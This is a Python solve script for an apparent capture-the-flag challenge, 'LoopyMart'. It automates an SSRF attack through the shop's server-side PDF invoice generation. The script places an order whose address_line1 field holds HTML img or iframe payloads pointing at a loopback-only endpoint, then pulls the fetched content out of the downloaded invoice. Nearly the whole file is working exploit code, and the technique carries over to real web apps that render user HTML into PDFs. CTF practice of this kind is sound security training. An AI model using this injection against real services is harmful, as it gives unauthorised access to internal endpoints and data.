#!/usr/bin/env python3
"""
SSRF Invoice PDF Exploit – LoopyMart CTF

Attack vector: HTML tags in any shipping-address field are rendered server-side
when the PDF invoice is generated (GET /orders/{id}/invoice).  The backend uses
urllib.request.urlopen() to resolve <img src> and <iframe src> attributes with
no host or scheme allowlist.

The flag lives at GET /flag.txt which is loopback-only (HTTP 403 externally):
  http://127.0.0.1:8001/flag.txt

This script automates the full exploit chain:
  1. Login
  2. Find the first available product and add it to cart
  3. Place a COD order with the <iframe> payload in address_line1
  4. Download the PDF invoice
  5. Extract the CTF flag from the raw PDF bytes

Optional two-step discovery flow (--probe first, then --exfil):
  Step 1 – probe:  place order with <img src> to confirm blind SSRF
  Step 2 – exfil:  place order with <iframe src> to retrieve flag

Usage:
    python solve.py --email you@example.com --password yourpassword
    python solve.py --email you@example.com --password yourpassword --probe
    python solve.py --email you@example.com --password yourpassword --url http://localhost:8001
"""

import argparse
import re
import sys

try:
    import requests
except ImportError:
    print("requests is not installed.  Run: pip install requests")
    sys.exit(1)

# Default exfil payload — iframe fetches the loopback-only /flag.txt endpoint
EXFIL_PAYLOAD = (
    '<iframe src="http://127.0.0.1:8001/flag.txt" width="500" height="500"></iframe>'
)

# Probe payload — img tag to confirm blind SSRF (expect broken-image stamp in PDF)
PROBE_PAYLOAD = '<img src="http://127.0.0.1:8001/nonexistent">'

BASE_ADDR = {
    "full_name": "Invoice Tester",
    "phone": "9000000001",
    "pincode": "110001",
    "address_line2": "",
    "landmark": "",
    "city": "Delhi",
    "state": "Delhi",
    "country": "India",
    "address_type": "Home",
}


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def login(base_url: str, email: str, password: str) -> str:
    resp = requests.post(
        f"{base_url}/auth/login",
        json={"email": email, "password": password},
        timeout=10,
    )
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login response missing access_token")
        sys.exit(1)
    print(f"[+] Logged in as {email}")
    return token


def get_product_id(base_url: str, token: str) -> str:
    resp = requests.get(
        f"{base_url}/products",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    resp.raise_for_status()
    data = resp.json()
    products = data.get("products") or data  # handle both list and paginated response
    if not products:
        print("[-] No products found in catalogue")
        sys.exit(1)
    pid = products[0]["id"]
    print(f"[+] Using product ID: {pid}  ({products[0].get('name', '')})")
    return pid


def add_to_cart(base_url: str, token: str, product_id: str) -> None:
    resp = requests.post(
        f"{base_url}/cart",
        json={"product_id": product_id, "quantity": 1},
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    resp.raise_for_status()
    print("[+] Product added to cart")


def create_order(base_url: str, token: str, addr: dict) -> str:
    resp = requests.post(
        f"{base_url}/orders",
        json={"shipping_address": addr},
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    resp.raise_for_status()
    order_id = resp.json()["id"]
    print(f"[+] Order created: {order_id}")
    print(f"    address_line1 payload: {addr['address_line1'][:80]}")
    return order_id


def download_invoice(base_url: str, token: str, order_id: str) -> bytes:
    resp = requests.get(
        f"{base_url}/orders/{order_id}/invoice",
        headers={"Authorization": f"Bearer {token}"},
        timeout=30,
    )
    resp.raise_for_status()
    print(f"[+] Invoice PDF received ({len(resp.content)} bytes)")
    return resp.content


def extract_flags(pdf_bytes: bytes) -> list[str]:
    """Scan raw PDF bytes for CTF{...} patterns (works for reportlab ASCII PDFs)."""
    return [m.decode("ascii") for m in re.findall(rb"CTF\{[^}]+\}", pdf_bytes)]


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Exploit LoopyMart SSRF – Invoice PDF via HTML injection in address fields"
    )
    parser.add_argument(
        "--url", default="http://localhost:8001",
        help="API base URL  (default: http://localhost:8001)",
    )
    parser.add_argument("--email",    required=True, help="Registered user email")
    parser.add_argument("--password", required=True, help="User password")
    parser.add_argument(
        "--probe", action="store_true",
        help="Use <img> probe payload instead of <iframe> exfil payload (step 1 of 2)",
    )
    parser.add_argument(
        "--save", metavar="FILE",
        help="Also save the downloaded PDF to this path",
    )
    args = parser.parse_args()

    payload = PROBE_PAYLOAD if args.probe else EXFIL_PAYLOAD
    step_label = "probe (blind SSRF confirmation)" if args.probe else "exfil (flag retrieval)"

    print("=" * 60)
    print("  SSRF Invoice Exploit – LoopyMart CTF")
    print("=" * 60)
    print(f"  Mode: {step_label}")
    print()

    token = login(args.url, args.email, args.password)

    product_id = get_product_id(args.url, token)
    add_to_cart(args.url, token, product_id)

    addr = {**BASE_ADDR, "address_line1": payload}
    order_id = create_order(args.url, token, addr)

    print(f"[*] Downloading invoice (server will process payload during PDF render)")
    try:
        pdf_bytes = download_invoice(args.url, token, order_id)
    except requests.HTTPError as exc:
        print(f"[-] HTTP {exc.response.status_code}: {exc.response.text[:300]}")
        sys.exit(1)

    if args.save:
        with open(args.save, "wb") as fh:
            fh.write(pdf_bytes)
        print(f"[+] PDF saved to {args.save}")

    flags = extract_flags(pdf_bytes)
    print()
    if flags:
        for flag in flags:
            print(f"\U0001f3c1  FLAG: {flag}")
        print()
        print("[+] Done.")
    elif args.probe:
        print("[*] Probe sent. Open the PDF and look for the broken-image stamp in")
        print("    the Shipping Address section to confirm blind SSRF, then re-run")
        print("    without --probe to exfiltrate the flag.")
    else:
        print("[-] No CTF{...} flag found in the PDF bytes.")
        print("    Try --save invoice.pdf and inspect it manually.")


if __name__ == "__main__":
    main()
